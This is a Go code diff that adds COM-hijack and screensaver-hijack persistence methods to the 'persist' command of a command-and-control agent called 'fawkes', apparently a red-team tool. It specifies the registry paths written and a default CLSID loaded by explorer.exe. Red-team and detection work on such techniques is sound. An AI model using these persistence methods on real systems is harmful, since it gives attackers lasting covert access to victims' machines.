@@ -9,12 +9,12 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "persist",
-		Description:         "Install or remove persistence mechanisms (registry run key, startup folder)",
-		HelpString:          "persist -method <registry|startup-folder|list> -action <install|remove> -name <name> [-path <exe_path>] [-hive <HKCU|HKLM>]",
-		Version:             1,
+		Description:         "Install or remove persistence mechanisms (registry run key, startup folder, COM hijacking, screensaver hijacking)",
+		HelpString:          "persist -method <registry|startup-folder|com-hijack|screensaver|list> -action <install|remove> [-name <name>] [-path <exe_path>] [-hive <HKCU|HKLM>] [-clsid <CLSID>] [-timeout <seconds>]",
+		Version:             2,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1547.001", "T1547.009"},
+		MitreAttackMappings: []string{"T1547.001", "T1547.009", "T1546.015", "T1546.002"},
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
@@ -25,8 +25,8 @@ func init() {
 				ModalDisplayName: "Persistence Method",
 				CLIName:          "method",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"registry", "startup-folder", "list"},
-				Description:      "Persistence method: registry (Run key), startup-folder (copy to Startup), or list (enumerate existing)",
+				Choices:          []string{"registry", "startup-folder", "com-hijack", "screensaver", "list"},
+				Description:      "Persistence method: registry (Run key), startup-folder (copy to Startup), com-hijack (CLSID override), screensaver (idle trigger), or list (enumerate all)",
 				DefaultValue:     "registry",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -93,6 +93,34 @@ func init() {
 					},
 				},
 			},
+			{
+				Name:             "clsid",
+				ModalDisplayName: "CLSID",
+				CLIName:          "clsid",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "COM object CLSID to hijack (for com-hijack method). Default: {42aedc87-2188-41fd-b9a3-0c966feabec1} (MruPidlList, loaded by explorer.exe)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:             "timeout",
+				ModalDisplayName: "Timeout (seconds)",
+				CLIName:          "timeout",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Idle timeout in seconds before screensaver triggers (for screensaver method). Default: 60",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
 		},
 		AssociatedBrowserScript: nil,
 		TaskFunctionOPSECPre:    nil,
@@ -111,11 +139,22 @@ func init() {
 			action, _ := taskData.Args.GetStringArg("action")
 			name, _ := taskData.Args.GetStringArg("name")
 			if action == "install" {
-				if method == "registry" {
+				switch method {
+				case "registry":
 					hive, _ := taskData.Args.GetStringArg("hive")
 					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\%s", hive, name))
-				} else if method == "startup-folder" {
+				case "startup-folder":
 					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Startup folder: %s", name))
+				case "com-hijack":
+					clsid, _ := taskData.Args.GetStringArg("clsid")
+					if clsid == "" {
+						clsid = "{42aedc87-2188-41fd-b9a3-0c966feabec1}"
+					}
+					path, _ := taskData.Args.GetStringArg("path")
+					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("HKCU\\Software\\Classes\\CLSID\\%s\\InprocServer32 = %s", clsid, path))
+				case "screensaver":
+					path, _ := taskData.Args.GetStringArg("path")
+					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("HKCU\\Control Panel\\Desktop\\SCRNSAVE.EXE = %s", path))
 				}
 			}
 			return response
